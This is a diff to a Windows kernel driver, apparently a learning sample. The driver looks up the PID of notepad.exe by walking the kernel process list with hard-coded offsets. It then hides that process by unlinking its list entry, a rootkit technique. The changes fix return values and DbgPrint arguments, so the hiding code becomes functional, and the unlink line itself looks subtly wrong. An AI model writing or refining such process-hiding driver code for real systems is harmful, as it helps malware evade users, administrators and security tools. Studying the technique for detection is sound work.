@@ -44,10 +44,11 @@ NTSTATUS HideProcess(int UniqueProcessId) {
 	list_entry.Flink->Blink = list_entry.Blink->Flink;
 
 	ZwClose(hProcess);
+	return STATUS_SUCCESS;
 }
 
 
-int getPIDByName(wchar_t *name) {
+int getPIDByName(wchar_t* name) {
 	PEPROCESS ep;
 	if (::PsLookupProcessByProcessId(::PsGetCurrentProcessId(), &ep) == STATUS_INVALID_PARAMETER) {
 		ObDereferenceObject(ep);
@@ -78,12 +79,13 @@ int getPIDByName(wchar_t *name) {
 		List_Entry = List_Entry->Flink;
 	}
 	if (Process_List_Entry == List_Entry->Flink) {
-		DbgPrint("%wZ isn't running quiting!" , name);
+		DbgPrint("%wZ isn't running quiting!", name);
 		return STATUS_SUCCESS;
 	}
 	pUpi = ((LPBYTE)List_Entry->Blink) - 0x448 + 0x440;
 	int UniqueProcessId = *((int*)pUpi); //Notepad PID
-	DbgPrint("The PID of %wZ is %d\n", UniqueProcessId , name);
+	DbgPrint("The PID of %ls is %d\n", name, UniqueProcessId);
+	return UniqueProcessId;
 }
 
 
@@ -95,9 +97,9 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	DriverObject->DriverUnload = SampleUnload;
 	DbgPrint("Sample driver Load called\n");
 
-	
+
 	HideProcess(getPIDByName(L"notepad.exe"));
 	DbgPrint("Finish");
-	
+
 	return STATUS_SUCCESS;
-}              
+}
